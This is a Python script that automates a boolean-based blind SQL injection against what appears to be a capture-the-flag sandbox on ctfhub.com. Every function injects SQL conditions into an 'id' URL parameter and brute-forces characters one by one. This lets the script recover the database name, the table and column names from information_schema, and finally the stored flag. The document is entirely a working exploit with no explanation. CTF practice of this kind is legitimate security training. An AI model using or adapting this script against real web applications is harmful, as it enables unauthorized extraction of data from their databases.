import requests
import string

def req(cmd) -> bool:
    response = requests.get("http://challenge-0a8832eda8b07965.sandbox.ctfhub.com:10800/?id=1 and {}".format(cmd))
    if("query_success" in response.content.decode()):
        return True
    return False

def is_case_sensitive() -> bool:
    return not req("'a' = 'A'")

def dump_length(cmd) -> int:
    len = 1
    while(not req("length({})={}".format(cmd,len))):
        len += 1
    return len

def dump_tables_length(db_name) -> int:
    len = 1
    while(not req("(select length(group_concat(table_name)) from information_schema.tables where table_schema='{}') = {}".format(db_name,len))):
        len += 1
    return len

def dump_columns_length(table_name) -> int:
    len = 1
    while(not req("(select length(group_concat(column_name)) from information_schema.columns where table_schema='{}') = {}".format(table_name,len))):
        len += 1
    return len

def dump_flag_length(column,db_name,table) -> int:
    len = 1
    while(not req("(select length(group_concat({})) from {}.{}) = {}".format(column,db_name,table,len))):
        # print(len)
        len += 1
    return len

def dump_str(cmd,len) -> str:
    str = ""
    for i in range(1,len + 1):
        for c in "," + string.ascii_letters:
            if(req("substr({},{},1) = '{}'".format(cmd,i,c))):
                str += c
                print("find: {}".format(c))
                break
    return str

def dump_tables(db_name,len) -> str:
    str = ""
    for i in range(1,len + 1):
        for c in "," + string.ascii_letters:
            if(req("(select substr(group_concat(table_name),{},1) from information_schema.tables where table_schema='{}') = '{}'".format(i,db_name,c))):
                str += c
                print("find: {}".format(c))
                break
    return str

def dump_columns(table_name,len) -> str:
    str = ""
    for i in range(1,len + 1):
        for c in "," + string.ascii_letters:
            if(req("(select substr(group_concat(column_name),{},1) from information_schema.columns where table_schema='{}') = '{}'".format(i,table_name,c))):
                str += c
                print("find: {}".format(c))
                break
    return str

def dump_flag(column,db_name,table,len) -> str:
    str = ""
    for i in range(1,len + 1):
        for c in string.printable:
            if(req("(select substr(group_concat({}),{},1) from {}.{}) = '{}'".format(column,i,db_name,table,c))):
                str += c
                print("find: {}".format(c))
                break
    return str

def run(cmd) -> str:
    length = dump_length(cmd)
    return dump_str(cmd,length)


db_name = run("database()")

print("db_name: {}".format(db_name))

tables_length = dump_tables_length(db_name)

print("tables_length: {}".format(tables_length))

tables = dump_tables(db_name,tables_length)

print("tables: {}".format(tables))

table = "flag"

columns_length = dump_columns_length(table)

print("columns_length: {}".format(columns_length))

columns = dump_columns(table,columns_length)

print("columns: {}".format(columns))

db_name = "sqli"

flag_length = dump_flag_length("flag",db_name,"flag")

print("flag_length: {}".format(flag_length))

flag = dump_flag("flag",db_name,"flag",flag_length)

print(flag)